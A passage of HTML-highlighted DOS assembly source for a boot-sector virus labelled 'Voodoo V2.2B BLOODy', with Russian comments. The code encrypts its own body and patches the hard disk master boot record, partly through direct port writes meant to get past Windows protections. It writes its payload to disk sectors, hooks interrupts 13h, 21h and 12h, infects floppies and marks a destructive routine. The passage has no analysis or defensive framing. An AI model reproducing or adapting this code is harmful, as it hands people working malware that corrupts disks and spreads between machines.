           </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ADD_Bady_To_DI</span><span class="sc0">
                    </span><span class="sc1">; 2-й уровень</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00ffh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">keyCRC2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc5">keyCRC2offset</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">;set decript key</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeVCRC2</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">level2decript</span><span class="sc0">
</span><span class="sc5">@ll2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@ll2</span><span class="sc0">
            </span><span class="sc1">;-------------</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">keyCRC</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">sizeV</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">@ll</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@ll</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ADD_Bady_To_DI</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeV</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Voodoo V2.2B BLOODy'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'//SMF'</span><span class="sc0">
</span><span class="sc5">decript_MBR</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">512</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decriptMBR</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">infect_MBR</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0dh</span><span class="sc4">],</span><span class="sc2">012cdh</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ale</span><span class="sc0">
</span><span class="sc1">;--------- сохраним MBR in  0 0 20 --------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_MBR</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_MBR</span><span class="sc0">
           </span><span class="sc1">; patch mbr --</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_MBR</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_New_MBR</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New_MBR</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
           </span><span class="sc1">;-------------</span><span class="sc0">
        </span><span class="sc1">;jmp notwritetombr</span><span class="sc0">
</span><span class="sc1">; Пытаемля записаться через порты</span><span class="sc0">
</span><span class="sc1">; В винде нас обламают</span><span class="sc0">
</span><span class="sc1">; тогда мы запишемся через СД13</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">3F6H</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">;Turn off IRQ 14</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">WAITHD</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">66ffh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ERRORPTR</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">writeMBR_PORT</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">alldone</span><span class="sc0">
      </span><span class="sc1">; --- Set MBR to 0 0 1 (40) ---</span><span class="sc0">
</span><span class="sc5">ERRORPTR</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">3F6H</span><span class="sc0">     </span><span class="sc1">;Turn on IRQ 14 and exit</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">on</span><span class="sc0">
                </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
 </span><span class="sc5">alldone</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">notwritetombr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;------------------------------------------</span><span class="sc0">
</span><span class="sc1">;--- Запишемся на HDD 0 0 3 - 0 0 9  6 cek ------</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Make_Cript_Bady</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0309h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0">  </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
</span><span class="sc1">;-----Запишим декриптор  в  0 0 2  ---------------</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DecripterBOOT</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">
 </span><span class="sc5">ale</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Next_Code</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;################################################</span><span class="sc0">
</span><span class="sc1">;---- Трасируем cdх13 и cdх21  ----------------------</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">detectint21and13h</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6666h</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ERRor_NT</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">infect_MBR</span><span class="sc0">
</span><span class="sc5">ERRor_NT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">; ПОд НТ нас обламают.</span><span class="sc0">
</span><span class="sc1">;--- Прочтем MBR ------------</span><span class="sc0">
</span><span class="sc1">; Настроить MBR и записать</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">alredy_</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook_0x13h</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bad</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;addrOld21h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">82h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">addrOld21h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">addrOld21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc1">; set int 21</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Jumper</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_0x21</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Jumper</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">toJumper</span><span class="sc0">
           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">Jumper</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">int24h</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
           </span><span class="sc6">iret</span><span class="sc0">
  </span><span class="sc5">toJumper</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mov_ES_0000h</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">204h</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc1">;----</span><span class="sc0">
           </span><span class="sc6">cli</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mov_ES_0000h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">204h</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">sti</span><span class="sc0">
          </span><span class="sc1">;------------------</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exitfromMe</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">100H</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dosexit</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RET2EXEfrom</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">dosexit</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">
         </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">Make_Cript_Bady</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BEGIN</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ADD_Bady_To_DI</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@end</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">sizeV</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decriptMBR</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;  BOOT</span><span class="sc0">
</span><span class="sc1">;  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="sc0">
</span><span class="sc1">;  @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</span><span class="sc0">
</span><span class="sc1">;-----------------------------</span><span class="sc0">
</span><span class="sc5">FDD_Enter</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mov_ES_0000h</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Get_FDD_Param</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;drive</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">   </span><span class="sc1">; cil 80</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; sec</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07c00h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
          </span><span class="sc1">;SET 13 2 81</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">204h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">4ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">204h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">infect_MBR</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
          </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">contin_boot</span><span class="sc0">
          </span><span class="sc1">;jmp jmp2boot</span><span class="sc0">
</span><span class="sc1">;----- Read real boot --------</span><span class="sc0">
</span><span class="sc5">BOOT_ENTEre_point</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">0FDDh</span><span class="sc0">
                  </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">FDD_Enter</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Mov_ES_0000h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">07c00h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
                  </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
                  </span><span class="sc1">; - decript -</span><span class="sc0">
                  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">decript_MBR</span><span class="sc0">
                  </span><span class="sc5">contin_boot</span><span class="sc4">:</span><span class="sc0">
                  </span><span class="sc1">; DESTR !</span><span class="sc0">
                  </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">LOGO</span><span class="sc0">
                  </span><span class="sc1">; hook 0x12</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">048h</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; save 0x12</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">048h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old12h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
